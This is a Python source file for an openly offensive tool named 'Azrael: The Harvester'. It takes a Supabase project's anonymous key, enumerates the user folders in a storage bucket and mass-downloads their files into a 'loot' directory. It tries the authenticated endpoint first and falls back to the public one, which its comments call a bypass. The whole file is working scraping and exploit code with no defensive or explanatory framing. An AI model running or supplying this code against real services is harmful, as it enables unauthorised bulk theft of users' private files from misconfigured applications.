import requests
import os
import time

class Azrael:
    """
    AZRAEL: The Harvester.
    Module for bypassing storage restrictions and mass-downloading assets.
    """
    def __init__(self, supabase_url, anon_key):
        self.url = supabase_url
        self.key = anon_key
        self.headers = {
            "apikey": self.key,
            "Authorization": f"Bearer {self.key}",
            "Content-Type": "application/json"
        }

    def reap(self, bucket_name, output_dir="loot/avatars"):
        """
        Bypasses 400 errors on public buckets using authenticated endpoints.
        """
        print(f"\n[AZRAEL] Summoned to harvest '{bucket_name}'...")
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        # 1. List Objects (Root)
        url_list = f"{self.url}/storage/v1/object/list/{bucket_name}"
        payload = {"prefix": "", "sortBy": {"column": "name", "order": "asc"}, "limit": 100}
        
        try:
            resp = requests.post(url_list, headers=self.headers, json=payload)
            if resp.status_code != 200:
                print(f"  [!] Failed to list bucket: {resp.status_code}")
                return

            items = resp.json()
            # Identify folders (items with null id are folders in Supabase storage list)
            # In this specific case, the root items are FOLDERS (UUIDs).
            folders = [x['name'] for x in items if x.get('id') is None] 
            print(f"  [+] Identified {len(folders)} user folders.")

            count = 0
            for folder in folders:
                # Recursively list inside the folder
                payload_folder = {"prefix": folder, "limit": 10}
                r2 = requests.post(url_list, headers=self.headers, json=payload_folder)
                
                if r2.status_code == 200:
                    files = r2.json()
                    for f in files:
                        if f['name'] == folder: continue # Skip the folder itself if returned
                        
                        # The 'name' field in the sub-list is just the filename (e.g., "avatar.jpg")
                        # We must prepend the folder (UUID) to get the full path.
                        
                        file_name = f['name']
                        full_path = f"{folder}/{file_name}"
                        
                        # Verify it's not a folder (folders have id=None usually, but sometimes not in sub-lists)
                        # Best check: does it have a mimetype? or metadata?
                        if f.get('id') is None: continue 

                        # THE BYPASS: Try authenticated first, then public
                        # Construct URL: bucket/folder/filename
                        download_url = f"{self.url}/storage/v1/object/authenticated/{bucket_name}/{full_path}"
                        
                        save_name = full_path.replace("/", "_")
                        save_path = os.path.join(output_dir, save_name)
                        
                        if os.path.exists(save_path): continue

                        print(f"    [REAPING] {full_path} -> {save_name}")
                        r_img = requests.get(download_url, headers=self.headers)
                        
                        if r_img.status_code != 200:
                            # Fallback to public
                            public_url = f"{self.url}/storage/v1/object/public/{bucket_name}/{full_path}"
                            r_img = requests.get(public_url, headers=self.headers)

                        if r_img.status_code == 200:
                            with open(save_path, "wb") as img_f:
                                img_f.write(r_img.content)
                            count += 1
                        else:
                            print(f"    [!] Failed: {r_img.status_code}")
                        
                        time.sleep(0.1)
            
            print(f"  [AZRAEL] Harvest complete. {count} souls collected.")

        except Exception as e:
            print(f"  [!] Exception: {e}")
